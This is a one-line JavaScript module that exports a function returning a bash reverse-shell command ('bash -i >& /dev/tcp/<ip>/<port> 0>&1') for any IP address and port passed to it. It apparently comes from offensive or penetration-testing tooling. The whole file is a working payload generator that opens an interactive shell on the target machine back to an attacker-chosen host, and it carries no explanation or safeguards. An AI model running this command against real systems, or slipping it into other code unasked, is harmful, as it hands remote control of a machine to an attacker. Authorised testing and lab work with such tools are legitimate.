module.exports = (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
